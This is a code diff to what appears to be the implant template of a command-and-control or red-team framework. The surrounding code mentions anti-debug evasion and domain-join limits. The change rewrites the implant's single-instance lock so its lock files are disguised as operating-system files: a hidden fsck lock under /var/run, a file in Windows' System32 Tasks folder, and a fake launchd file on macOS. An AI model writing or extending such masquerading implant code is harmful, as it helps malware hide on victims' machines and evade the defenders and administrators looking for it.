@@ -42,7 +42,7 @@ import (
 	// {{else}}{{end}}
 
 	// {{if .Config.LimitSingleInstance}}
-	"github.com/postfinance/single"
+	"github.com/allan-simon/go-singleinstance"
 	// {{end}}
 )
 
@@ -54,28 +54,29 @@ func ExecLimits() {
 	PlatformLimits() // Anti-debug & other platform specific evasion
 	// {{end}}
 
-	// {{if .Config.Debug}}
-	log.Printf("just making sure my modifications are in the binary")
-	// {{end}}
-
 	// {{if .Config.LimitSingleInstance}}
-	// {{if .Config.Debug}}
-	log.Printf("inside LimitSingleInstance")
+	lockFileName := "/var/run/.fsck-lock"
+	// {{if eq .Config.GOOS "windows"}}{
+	lockFileName = "C:\\Windows\\System32\\Tasks\\SA2.dat"
 	// {{end}}
-	one, err := single.New("fsck-lock")
+	// {{if eq .Config.GOOS "darwin"}}{
+	lockFileName = "/tmp/.com.apple.launchd.JNuS4wNQlN"
+	// {{end}}
 
 	// {{if .Config.Debug}}
-	log.Printf("Lockfile: %s", one.Lockfile())
+	log.Printf("Using lock file: %s", lockFileName)
 	// {{end}}
 
-	// lock and defer unlocking
-	if err := one.Lock(); err != nil {
+	_, err := singleinstance.CreateLockFile(lockFileName)
+	if err != nil {
 		// {{if .Config.Debug}}
-		log.Fatal(err)
+		log.Println(err.Error())
+		log.Fatal("an instance already exists")
 		// {{end}}
 		os.Exit(1)
 	}
-	defer one.Unlock()
+	// cannot defer the close here because it will close while still running
+	// defer lockFile.Close()
 	// {{end}}
 
 	// {{if .Config.LimitDomainJoined}}
